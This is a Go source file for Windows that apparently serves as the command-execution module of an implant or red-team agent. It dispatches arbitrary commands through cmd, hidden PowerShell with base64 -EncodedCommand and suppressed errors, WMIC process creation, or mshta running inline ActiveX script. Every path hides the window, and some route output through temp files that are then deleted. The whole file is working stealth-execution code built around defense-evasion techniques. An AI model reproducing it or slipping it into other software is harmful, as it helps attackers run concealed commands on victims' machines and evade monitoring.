//go:build windows

package exec

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
)

const createNoWindow = 0x08000000

// RunCommand dispatches to the configured execution method.
// method: direct | cmd | powershell | wmi | mshta
func RunCommand(method, command string, timeout int) (stdout, stderr string, exitCode int) {
	ctx := context.Background()
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
		defer cancel()
	}

	switch method {
	case "powershell", "ps":
		return execPowerShell(ctx, command)
	case "wmi":
		return execWMIC(ctx, command)
	case "mshta":
		return execMSHTA(ctx, command)
	default:
		return execCMD(ctx, command)
	}
}

func execCMD(ctx context.Context, command string) (string, string, int) {
	cmd := exec.CommandContext(ctx, "cmd.exe", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	return strings.TrimSpace(out.String()), strings.TrimSpace(errBuf.String()), exitCodeFrom(err)
}

func execPowerShell(ctx context.Context, command string) (string, string, int) {
	wrapped := `$ProgressPreference='SilentlyContinue';$ErrorActionPreference='SilentlyContinue';` + command
	encoded := psEncode(wrapped)
	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	stderrStr := filterCLIXML(strings.TrimSpace(errBuf.String()))
	return strings.TrimSpace(out.String()), stderrStr, exitCodeFrom(err)
}

func filterCLIXML(s string) string {
	if !strings.Contains(s, "CLIXML") && !strings.Contains(s, "<Objs") {
		return s
	}
	var keep []string
	for _, line := range strings.Split(s, "\n") {
		t := strings.TrimSpace(line)
		if t == "#< CLIXML" || strings.HasPrefix(t, "<Objs") || strings.HasPrefix(t, "<Obj") {
			continue
		}
		keep = append(keep, line)
	}
	return strings.TrimSpace(strings.Join(keep, "\n"))
}

func execWMIC(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	wrapped := fmt.Sprintf(`cmd.exe /C %s > "%s" 2>&1`, command, tmp)

	cmd := exec.CommandContext(ctx, "wmic.exe", "process", "call", "create", wrapped)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	err := cmd.Run()

	deadline := time.Now().Add(15 * time.Second)
	if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
		deadline = dl
	}
	var output string
	for time.Now().Before(deadline) {
		if data, readErr := os.ReadFile(tmp); readErr == nil && len(data) > 0 {
			output = strings.TrimSpace(string(data))
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	os.Remove(tmp)
	return output, "", exitCodeFrom(err)
}

func execMSHTA(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	escapedCmd := strings.ReplaceAll(command, `"`, `\"`)
	escapedTmp := strings.ReplaceAll(tmp, `\`, `\\`)
	script := fmt.Sprintf(
		`javascript:a=new ActiveXObject("WScript.Shell");`+
			`a.Run("cmd /C %s > \"%s\" 2>&1",0,true);close();`,
		escapedCmd, escapedTmp,
	)
	cmd := exec.CommandContext(ctx, "mshta.exe", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	err := cmd.Run()

	data, _ := os.ReadFile(tmp)
	os.Remove(tmp)
	return strings.TrimSpace(string(data)), "", exitCodeFrom(err)
}

// PsEncode encodes a PowerShell command as UTF-16LE base64 for -EncodedCommand.
func PsEncode(command string) string { return psEncode(command) }

func psEncode(command string) string {
	u := utf16.Encode([]rune(command))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		binary.LittleEndian.PutUint16(b[i*2:], r)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func exitCodeFrom(err error) int {
	if err == nil {
		return 0
	}
	if ee, ok := err.(*exec.ExitError); ok {
		return ee.ExitCode()
	}
	return 1
}
